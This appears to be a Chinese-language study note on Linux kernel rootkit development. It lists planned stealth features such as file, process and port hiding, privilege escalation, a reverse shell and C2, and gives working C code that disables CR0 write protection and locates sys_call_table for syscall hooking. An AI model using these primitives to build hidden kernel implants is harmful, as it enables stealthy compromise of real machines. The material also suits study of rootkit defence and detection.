# 功能
需要前置知识：[[Linux 驱动开发]]

模块
- 隐藏自己模块
- 控制模块加载，劫持其他模块
- 感染系统模块

文件
- 文件隐藏
- 文件增加删除修改
- 劫持`cat /etc/passwd`

进程
- 进程隐藏
- 进程提权
- 内核进程创建

网络：
- 网络连接隐藏、端口隐藏
- 反弹shell
- c2tongxin
-  隐藏网卡混杂模式


# 参考资料
https://github.com/NoviceLive/research-rootkit/

# 写保护切换
这个方法已经不能使用了，cr0和cr4敏感bit不能直接修改了，不过可以使用汇编修改
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8dbec27a242cd3e2816eeb98d3237b9f57cf6232
已失效:
```c
unsigned long original_cr0;
original_cr0 = read_cr0();//获取原始cr0寄存去内容
write_cr0(original_cr0 & ~0x00010000);//关闭写保护
write_cr0(original_cr0);//恢复写保护
```
使用下面代码，来自内核代码树
```c

extern unsigned long __force_order;

static inline void write_forced_cr0(unsigned long val) {
  asm volatile("mov %0,%%cr0" : "+r"(val), "+m"(__force_order));
}
static inline void zero_wp(void) { write_forced_cr0(read_cr0() & ~0x10000); }
static inline void one_wp(void) { write_forced_cr0(read_cr0() | 0x10000); }

static int lkm_init(void) {

  preempt_disable();
  zero_wp();
  printk("disable protection \n");
  printk("lkm: cr0=%lx\n", read_cr0());
  one_wp();
  printk("enable protection\n");
  printk("lkm: cr0=%lx\n", read_cr0());
  preempt_enable();

  return 0;
}

```
# sys_call_table获取方法
所有系统提供的能力都在系统调用中体现。

1. <2.6版本，`sys_call_table`就是一个导出符号，可以直接使用
2. <4.17版本，通过内核符号`sys_close`距离`sya_call_table`的偏移计算出`sys_call_table`的地址
3. <5.7版本，通过`kallsyms_lookup_name`函数来获得`sys_call_table`地址
4. 通过`kprobe`机制获得`sys_call_table`地址
5. 通过读取`/proc/kallsyms`来获得`sys_call_table`地址


```c
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
unsigned long **get_sct_via_sys_close(void) {
  unsigned long **entry = (unsigned long **)PAGE_OFFSET;

  for (; (unsigned long)entry < ULONG_MAX; entry += 1) {
    if (entry[__NR_close] == (unsigned long *)sys_close) {
      return entry;
    }
  }

  return NULL;
}
#endif

unsigned long **get_sct(void) {
  unsigned long **sct = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
  if (!sct) {
    struct kprobe kp = {0};
    int fail = 0;

    pr_info("Trying to get sct via kprobes....");
    kp.symbol_name = "sys_call_table";
    fail = register_kprobe(&kp);
    pr_info("register_kprobe = %d", fail);
    if (kp.addr) {
      sct = (unsigned long **)kp.addr;
    }
    if (!fail) {
      unregister_kprobe(&kp);
    }
  }
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
  if (!sct) {
    pr_info("Trying to get sct via kallsyms_lookup_name....");
    sct = (unsigned long **)kallsyms_lookup_name("sys_call_table");
  }
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
  if (!sct) {
    pr_info("Trying to get sct via sys_close....");
    sct = get_sct_via_sys_close();
  }
#endif
  if (sct) {
    pr_info("Got sct: %lx", (unsigned long)sct);
  } else {
    pr_alert("BUG: Failed to get sct!!! Please report.");
  }

  return sct;
}

static int lkm_init(void) {
  get_sct();
  return 0;
}

static void lkm_exit(void) { printk("goodby kernel!\n"); }

module_init(lkm_init);
/*未定义清楚函数则不允许卸载这个module */
module_exit(lkm_exit);
/* 声明license */
MODULE_LICENSE("GPL");
```
# rootkit 检测和绕过
#todo 
http://rkhunter.sourceforge.net/